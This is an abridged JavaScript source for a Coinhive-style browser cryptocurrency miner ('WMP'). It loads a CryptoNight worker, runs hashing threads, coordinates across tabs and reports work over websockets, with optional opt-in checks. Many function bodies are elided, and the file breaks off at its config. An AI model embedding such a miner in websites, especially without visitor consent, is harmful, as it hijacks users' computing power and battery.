(function(window) {
    "use strict";
    var WScript = function(siteKey, params) {
        this.params = params || {};
        ...
        if (window.BroadcastChannel) {
            try {
                this._bc = new BroadcastChannel("wmp");
        ...
        if (WMP.CONFIG.REQUIRES_AUTH) {
            this._auth = new WMP.Auth(this._siteKey, {
    ...
    WScript.prototype.start = function(mode, optInToken) {
        this._tab.mode = mode || WMP.IF_EXCLUSIVE_TAB;
    ...
    WScript.prototype.stop = function(mode) {
    ...
    WScript.prototype.getHashesPerSecond = function() {
    ...
    WScript.prototype.getTotalHashes = function(estimate) {
        var now = Date.now();
    ...
    WScript.prototype.getAcceptedHashes = function() {
        return this._hashes
    };
    /*WScript.prototype.getToken = function() {
        return this._tokenFromServer
    };*/
    WScript.prototype.on = function(type, callback) {
        if (this._eventListeners[type]) {
            this._eventListeners[type].push(callback)
        }
    };
    WScript.prototype.getAutoThreadsEnabled = function(enabled) {
        return this._autoThreads.enabled
    };
    WScript.prototype.setAutoThreadsEnabled = function(enabled) {
    ...
    WScript.prototype.hasWASMSupport = function() {
        return window.WebAssembly !== undefined
    };
    WScript.prototype.isRunning = function() {
        return this._threads.length > 0
    };
    WScript.prototype.isMobile = function() {
        return /mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)
    };
    WScript.prototype.didOptOut = function(seconds) {
        if (!WMP.CONFIG.REQUIRES_AUTH) {
            return false
        }
    ...
    WScript.prototype.selfTest = function(callback) {
        this._loadWorkerSource(function() {
            if (!this.verifyThread) {
                this.verifyThread = new WMP.JobThread
            }
            var testJob = {
                verify_id: "1",
                nonce: "204f150c",
    ...
    WScript.prototype._loadWorkerSource = function(callback) {
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function() {
                WMP.CRYPTONIGHT_WORKER_BLOB = WMP.Res(xhr.responseText);
                this._asmjsStatus = "loaded";
                callback()
            }.bind(this), xhr);
            xhr.open("get", WMP.CONFIG.LIB_URL + WMP.CONFIG.ASMJS_NAME, true);
            xhr.send()
        }
    };
    WScript.prototype._startNow = function() {
        if (this._tab.mode !== WMP.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === WMP.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === WMP.FORCE_EXCLUSIVE_TAB) {
        ...
        this._autoReconnect = true;
        if (WMP.CONFIG.REQUIRES_AUTH && !this._optInToken) {
    ...
    WScript.prototype._otherTabRunning = function() {
        if (this._tab.lastPingReceived > Date.now() - 1500) {
            return true
        }
        try {
            var tdjson = localStorage.getItem("wmp");
            if (tdjson) {
    ...
    WScript.prototype._updateTabs = function() {
        ...
        if (this.isRunning() && !this._waitingForAuth) {
            ...
            try {
                localStorage.setItem("wmp", JSON.stringify({
    ...
    WScript.prototype._adjustThreads = function() {
    ...
    WScript.prototype._emit = function(type, params) {
    ...
    WScript.prototype._hashString = function(s) {
        var hash = 5381,
            i = s.length;
        while (i) {
    ...
    WScript.prototype._connect = function() {
        if (this._socket) {
            return
        }
        var shards = WMP.CONFIG.WEBSOCKET_SHARDS;
    ...
    WScript.prototype._onOpen = function(ev) {
        this._emit("open");
        var params = {
    ...
    WScript.prototype._onError = function(ev) {
        this._emit("error", {
    ...
    WScript.prototype._onClose = function(ev) {
        if (ev.code >= 1003 && ev.code <= 1009) {
            this._reconnectRetry = 3;
            this._tab.waitReconnect = Date.now() + 3 * 1e3
        }
        for (var i = 0; i < this._threads.length; i++) {
            this._threads[i].stop()
        }
    ...
    WScript.prototype._onMessage = function(ev) {
        ...
        if (msg.type === "job") {
            ...
            if (console && console.error) {
                console.error("WMP Error:", msg.params.error)
            }
            this._emit("error", msg.params);
            if (msg.params.error === "invalid_site_key") {
                this._reconnectRetry = 1e3;
                this._tab.waitReconnect = Date.now() + 5 * 1e3
    ...
    WScript.prototype._setJob = function(job) {
    ...
    WScript.prototype._onTargetMet = function(result) {
    ...
    WScript.prototype._onVerified = function(verifyResult) {
        this._send("verified", verifyResult)
    };
    WScript.prototype._send = function(type, params) {
        if (!this._socket) {
            return
        }
        var msg = {
    ...
    window.WMP.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.WMP.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.WMP.FORCE_MULTI_TAB = "forceMultiTab";
    window.WMP.Token = function(siteKey, goal, params) {
        var miner = new WScript(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    window.WMP.User = function(siteKey, user, params) {
        var miner = new WScript(siteKey, params);
        miner._user = user;
        return miner
    };
    window.WMP.Anonymous = function(siteKey, params) {
...
(function(window) {
    ...
    var JobThread = function() {
        this.worker = new Worker(WMP.CRYPTONIGHT_WORKER_BLOB);
    ...
    window.WMP.JobThread = JobThread
})(window);
self.WMP = self.WMP || {};
self.WMP.CONFIG = {
